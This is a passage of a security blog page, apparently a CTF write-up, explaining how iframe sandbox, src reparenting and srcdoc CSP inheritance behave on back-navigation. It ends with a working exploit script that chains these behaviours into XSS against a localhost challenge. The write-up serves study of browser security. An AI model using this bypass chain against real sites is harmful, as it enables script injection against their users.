+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span>
+  <span class="token keyword">function</span> <span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    f<span class="token punctuation">.</span><span class="token function">removeAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">)</span>
+    f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\/script>'</span>
+  <span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>The testing process is:</p>
+<ol>
+<li>Wait for the iframe to finish loading, and you will see test1 on the screen. At this point, because there is a sandbox, the script will not execute.</li>
+<li>Press the load test2 button to remove the sandbox and load test2, causing the script to execute.</li>
+<li>Press the top-level navigation to jump the webpage to another location.</li>
+<li>Press the back button in the browser.</li>
+</ol>
+<p>So what is the expected situation after pressing the back button? There will be two results based on whether there is a bfcache; first, let’s look at the case with bfcache.</p>
+<p>If there is a bfcache, pressing the back button will return to the same state as before, and you can observe:</p>
+<ol>
+<li>The console does not show run, indicating that the script will not be executed again.</li>
+<li>The iframe’s src is test2.</li>
+<li>The random number in test2 is the same as before, indicating that the script in the iframe has not been executed again.</li>
+</ol>
+<p>After all, it’s called bfcache, so it will completely retain the previous state without reloading the webpage.</p>
+<p>What if there is no bfcache? Logically, the webpage should reload, so the expected situation would be as it was at the very beginning:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">sandbox</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;\/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+
+<p>This means that a sandboxed iframe loads test1.</p>
+<p>However, if you actually press the back button, you’ll find that the result is neither the initial sandbox + test1 nor the previous no sandbox + test2, but rather a combination of both: sandbox + test2.</p>
+<p>In other words, the sandbox attribute maintains the latest state of the page, which is present, but the iframe’s src is not the latest; it remains at the historical record of test2. When combined, it becomes sandboxed test2.</p>
+<p>This mechanism of “when going back, the iframe’s src returns to the last content” is called iframe reparenting. It seems there is no corresponding spec that fully describes it, and the implementations across different browsers vary.</p>
+<p>This behavior can be summarized as: “I have a page loaded by an iframe in my history, and now that you’ve pressed back, to enhance user experience, I want to place this page back into the iframe.” The paradox is that the attribute does not carry over the last one but directly uses the current page’s.</p>
+<p>If we reverse the process, it becomes a kind of iframe sandbox bypass:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span>f</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>data:text/html,test1:&lt;script>document.writeln(Math.random())&lt;\/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>load test2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token special-attr"><span class="token attr-name">onclick</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript">location <span class="token operator">=</span> <span class="token string">'a.html'</span></span><span class="token punctuation">"</span></span></span><span class="token punctuation">></span></span>top level navigation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span>
+  <span class="token keyword">function</span> <span class="token function">loadTest2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    f<span class="token punctuation">.</span><span class="token function">setAttribute</span><span class="token punctuation">(</span><span class="token string">'sandbox'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">)</span>
+    f<span class="token punctuation">.</span>src <span class="token operator">=</span> <span class="token string">'data:text/html,test2:&lt;script>document.writeln(Math.random())&lt;\/script>'</span>
+  <span class="token punctuation">&#125;</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>We first load a safe test1 without the sandbox attribute, and then we want to load the malicious test2, so we add the sandbox attribute, thinking that this would be fine.</p>
+<p>But little do we know that if you navigate the page elsewhere and then go back, you will encounter test2 without the sandbox.</p>
+<p>In summary, remember that when you go back:</p>
+<ol>
+<li>The sandbox attribute always follows the latest page.</li>
+<li>The src will be the last loaded webpage.</li>
+</ol>
+<h3><span id="3-inheritance-of-csp">3. Inheritance of CSP</span></h3><p>If using iframe src, since it embeds another independent webpage, there is no relation between the CSPs of the two pages, and they do not affect each other. However, if using srcdoc, there is an inheritance relationship.</p>
+<p>For example, with the following code:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'none'<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Test:&lt;script>document.writeln(Math.random())&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>a.html<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>top level navigation<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'run'</span><span class="token punctuation">)</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Due to the <code>script-src &#39;none&#39;</code> CSP, scripts on the page will not execute, and scripts in the srcdoc will also not execute, because typically the CSP of an iframe srcdoc inherits from its parent, which sounds reasonable.</p>
+<p>Next, let’s try something similar to what we just did:</p>
+<ol>
+<li>Confirm that there is a CSP on the page.</li>
+<li>Confirm that the script in srcdoc cannot execute.</li>
+<li>Press top-level navigation to go to another page.</li>
+<li>Update the file and remove the CSP from the head.</li>
+<li>Press back.</li>
+</ol>
+<p>Assuming there is no bfcache, what will happen when I return to this webpage? The expected behavior should be: “Just like the first load,” so the scripts on the page and the scripts in the srcdoc should have no CSP and should be able to execute code.</p>
+<p>But the answer is:</p>
+<ol>
+<li>The page indeed has no CSP, so the script can execute, and it prints run.</li>
+<li>However, the script in srcdoc is blocked by the CSP and cannot execute.</li>
+</ol>
+<p>This means that at this point, the CSP of the iframe srcdoc does not inherit from the current page but from the results in history, which causes this situation.</p>
+<p>In technical terms, this is called session history and policy container. The CSP of the iframe comes from the policy container, and the stored results of this policy container are related to session history. However, since I haven’t delved deeply into these two technical terms, I won’t elaborate further.</p>
+<h3><span id="putting-it-all-together">Putting It All Together</span></h3><p>From the above points, we know a few things when you go back:</p>
+<ol>
+<li>The sandbox attribute always follows the latest page.</li>
+<li>The src will be the last loaded webpage.</li>
+<li>The CSP of srcdoc will inherit the previous results.</li>
+</ol>
+<p>The behavior of the sandbox is clearly different from the other two; it is the only one that follows the latest page, while the other two follow the last results.</p>
+<p>Now, let’s review the core code of the topic (I removed the check for opener for better understanding of the core concept):</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">res<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+  &lt;script>
+  document.head.insertAdjacentHTML(
+    "beforeend",
+    \`&lt;meta http-equiv="Content-Security-Policy" content="script-src 'none';">\`
+  );
+  &lt;/script>
+  &lt;iframe srcdoc="</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">escape</span><span class="token punctuation">(</span>memo<span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">">&lt;/iframe>
+</span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>In the first step, we load a sandbox iframe, and the src will be our XSS payload:</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> challengeHost <span class="token operator">=</span> <span class="token string">'http://localhost:1337'</span>
+
+<span class="token keyword">const</span> xssPayload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;script>alert(1)&lt;\/script></span><span class="token template-punctuation string">`</span></span>
+<span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;iframe sandbox="allow-same-origin" src="/memo?memo=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>xssPayload<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token template-punctuation string">`</span></span>
+<span class="token keyword">const</span> win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challengeHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/memo?memo=</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>At this point, the content of this win will be:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'none';<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>
+    &lt;iframe
+      sandbox="allow-same-origin"
+      src="/memo?memo=&lt;script>alert(1)&lt;/script>">
+    &lt;/iframe>
+  <span class="token punctuation">'</span></span><span class="token punctuation">></span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>If we zoom in a bit on that sandbox iframe, the content inside this iframe is:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token comment">&lt;!-- Empty head, no CSP --></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script>alert(1)&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+
+<p>Due to the sandbox, the script will not execute, so there will be no CSP. However, because of the sandbox, the script in the srcdoc will also not execute.</p>
+<p>Next, we navigate to another page and open <code>/memo?memo=&lt;iframe&gt;&lt;/iframe&gt;</code>, at which point the content in the cookie will be replaced.</p>
+<p>Then we use <code>history.back()</code> to go back. At this time, as mentioned earlier, the webpage will reload, so the HTML of the webpage becomes:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'none';<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>
+        &lt;iframe>&lt;/iframe>
+    <span class="token punctuation">'</span></span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Although it looks empty, due to the reparenting behavior mentioned earlier, the content of that empty iframe will be the previous <code>/memo?memo=&lt;script&gt;alert(1)&lt;/script&gt;</code>.</p>
+<p>Next, also because of the previously mentioned characteristic: “the sandbox attribute always follows the current page,” the sandbox of this iframe is now gone. Since the sandbox is gone, the content becomes:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Content-Security-Policy<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>script-src 'none';<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">srcdoc</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;script>alert(1)&lt;/script><span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>iframe</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>Originally, the CSP was empty, but since the sandbox is gone, it has come back.</p>
+<p>However, the last and most important point is that, as mentioned earlier: “the CSP of srcdoc will inherit the previous result,” so this srcdoc’s CSP is unrelated to the current page but inherits from the previous one. What was the previous CSP? It was empty, so the script can execute, successfully achieving XSS.</p>
+<p>After removing the opener check from the problem, the exploit becomes much simpler and easier to understand:</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span><span class="token script"><span class="token language-javascript">
+  <span class="token keyword">const</span> challengeHost <span class="token operator">=</span> <span class="token string">'http://localhost:1337'</span>
+
+  <span class="token keyword">const</span> xssPayload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;script>alert(document.domain)&lt;\/script></span><span class="token template-punctuation string">`</span></span>
+  <span class="token keyword">const</span> payload <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">&lt;iframe sandbox="allow-same-origin" src="/memo?memo=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>xssPayload<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">"></span><span class="token template-punctuation string">`</span></span>
+  <span class="token keyword">const</span> win <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challengeHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/memo?memo=</span><span class="token template-punctuation string">`</span></span> <span class="token operator">+</span> payload<span class="token punctuation">)</span>
+
+  <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">const</span> win2 <span class="token operator">=</span> window<span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>challengeHost<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">/memo?memo=&lt;iframe>&lt;/iframe></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span>
+    <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
+      win2<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+      win<span class="token punctuation">.</span>location <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Blob</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">
+        &lt;script>
+          setTimeout(() => &#123;
+           history.back();
+          &#125;, 500);
+        &lt;\/script>
+      </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> <span class="token literal-property property">type</span><span class="token operator">:</span> <span class="token string">"text/html"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
+  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token number">1000</span><span class="token punctuation">)</span>
+</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>This is the solution to the problem, mainly relying on the fact that when returning to the previous page, the sources of the sandbox and CSP are different, creating a difference that achieves XSS.</p>
+<h2><span id="summary">Summary</span></h2><p>According to the author, the inspiration for this problem came from this issue: <a target="_blank" rel="noopener" href="https://github.com/whatwg/html/issues/6809">srcdoc and sandbox interaction with session history #6809</a>. While writing this, I also read this issue several times and conducted many experiments before finally understanding the intricacies. The key is to try it out yourself after reading; after a few attempts, you will likely understand how it works.</p>
+<p>By the way, the author of this issue, Jake Archibald, is the host of <a target="_blank" rel="noopener" href="https://www.youtube.com/playlist?list=PLNYkxOF6rcIAKIQFsNbV0JDws_G_bnNo9">HTTP 203</a>. This program should be familiar to front-end engineers, as it discusses many web-related topics. One of the must-read classics for front-end engineers, <a target="_blank" rel="noopener" href="https://jakearchibald.com/2015/tasks-microtasks-queues-and-schedules/">Tasks, microtasks, queues and schedules</a>, was also written by him.</p>
+
+    
+    </div>
+    
+    <div class="columns is-variable is-1 is-multiline is-mobile">
+    
+        <span class="column is-narrow"><a class="tag is-light article-tag" href="/en/tags/Security/">#Security</a></span>
+    
+    </div>
+    
+    
+    <div class="columns is-mobile is-multiline article-nav">
+        <span class="column is-12-mobile is-half-desktop is-hidden-mobile article-nav-prev">
+            
+        </span>
+        <span class="column is-12-mobile is-half-desktop  article-nav-next">
+            
+            <a href="/2024/06/28/en/google-ctf-2024-writeup/">GoogleCTF 2024 Writeups</a>
+            
+        </span>
+    </div>
+    
+</article>
+
+
+
+
+<div class="comments">
+    <h3 class="title is-4">Comments</h3>
+    <script src="https://utteranc.es/client.js"
+        repo="aszx87410/huli-blog"
+        issue-term="title"
+        theme="github-light"
+        crossorigin="anonymous"
+        async>
+</script>
+</div>
+
+    </div>
+</section>
+    <footer class="footer">
+    <div class="container">
+        <div class="columns content">
+            <div class="column is-narrow has-text-centered">
+                &copy; 2024 Huli&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a
+                        target="_blank" rel="noopener" href="http://github.com/ppoffice/hexo-theme-minos">Minos</a>
+            </div>
+            <div class="column is-hidden-mobile"></div>
+
+            
+            <div class="column is-narrow">
+                <div class="columns is-mobile is-multiline is-centered">
+                
+                    
+                <a class="column is-narrow" title="GitHub" target="_blank" rel="noopener" href="https://github.com/ppoffice/hexo-theme-minos">
+                    
+                    GitHub
+                    
+                </a>
+                
+                </div>
+            </div>
+            
+            
+<div class="column is-narrow has-text-centered">
+    <div class="dropdown is-up is-right is-hoverable" style="margin-top: -0.2em;">
+        <div class="dropdown-trigger">
+            <button class="button is-small" aria-haspopup="true">
+                <span class="icon">
+                    <i class="fas fa-globe"></i>
+                </span>
+                <span>English</span>
+                <span class="icon is-small">
+            <i class="fas fa-angle-down" aria-hidden="true"></i>
+          </span>
+            </button>
+        </div>
+        <div class="dropdown-menu has-text-left" role="menu" style="top:100%">
+            <div class="dropdown-content">
+            <!-- NOTE: 永遠回到首頁 -->
+            
+                <a href="/2024/09/07/idek-ctf-2024-iframe/" class="dropdown-item">
+                    繁體中文
+                </a>
+            
+            </div>
+        </div>
+    </div>
+</div>
+
+        </div>
+    </div>
+</footer>
+    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.6.3/jquery.min.js"></script>
+
+
+
+    
+    
+    
+    
+    
+    
+<script src="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/js/lightgallery-all.min.js"></script>
+<script>
+    (function ($) {
+        $(document).ready(function () {
+            if (typeof($.fn.lightGallery) === 'function') {
+                $('.article.gallery').lightGallery({ selector: '.gallery-item' });
+            }
+        });
+    })(jQuery);
+</script>
+
+    
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.0/clipboard.min.js"></script>
+    <style>
+        .hljs {
+            position: relative;
+        }
+
+        .hljs .clipboard-btn {
+            float: right;
+            color: #9a9a9a;
+            background: none;
+            border: none;
+            cursor: pointer;
+        }
+
+        .hljs .clipboard-btn:hover {
+          color: #8a8a8a;
+        }
+
+        .hljs > .clipboard-btn {
+            display: none;
+            position: absolute;
+            right: 4px;
+            top: 4px;
+        }
+
+        .hljs:hover > .clipboard-btn {
+            display: inline;
+        }
+
+        .hljs > figcaption > .clipboard-btn {
+            margin-right: 4px;
+        }
+    </style>
+    <script>
+      $(document).ready(function () {
+        $('figure.hljs').each(function(i, figure) {
+          var codeId = 'code-' + i;
+          var code = figure.querySelector('.code');
+          var copyButton = $('<button>Copy <i class="far fa-clipboard"></i></button>');
+          code.id = codeId;
+          copyButton.addClass('clipboard-btn');
+          copyButton.attr('data-clipboard-target-id', codeId);
+
+          var figcaption = figure.querySelector('figcaption');
+
+          if (figcaption) {
+            figcaption.append(copyButton[0]);
+          } else {
+            figure.prepend(copyButton[0]);
+          }
+        })
+
+        var clipboard = new ClipboardJS('.clipboard-btn', {
+          target: function(trigger) {
+            return document.getElementById(trigger.getAttribute('data-clipboard-target-id'));
+          }
+        });
+        clipboard.on('success', function(e) {
+          e.clearSelection();
+        })
+      })
+    </script>
+
+    
+    
+
+    
+
+
+
+<script src="/js/script.js?v=3.js"></script>
+
+
+    
+</body>
+</html>
